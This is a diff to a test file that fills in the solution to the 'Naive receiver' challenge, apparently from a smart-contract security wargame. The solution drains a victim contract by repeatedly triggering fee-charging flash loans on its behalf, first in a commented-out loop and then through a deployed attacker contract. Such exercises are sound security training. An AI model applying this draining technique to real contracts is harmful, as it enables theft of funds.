@@ -37,7 +37,20 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** this does it in ten transactions, but a contract should be able to do it in one transaction
+         *  anybody can do a flash loan, so we just rely on the fee to deplete the contract
+         **/
+
+        /*
+        const ETH = await pool.ETH();
+        for(let i = 0; i < 10; i++){
+            await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
+        }*/
+
+        /** to do it in one transaction, you shuld deploy a contract that does the same thing **/
+        const attackerFactor = await ethers.getContractFactory('NaiveReceiverAttacker', deployer);
+        await attackerFactor.deploy(pool.address, receiver.address);
+
     });
 
     after(async function () {
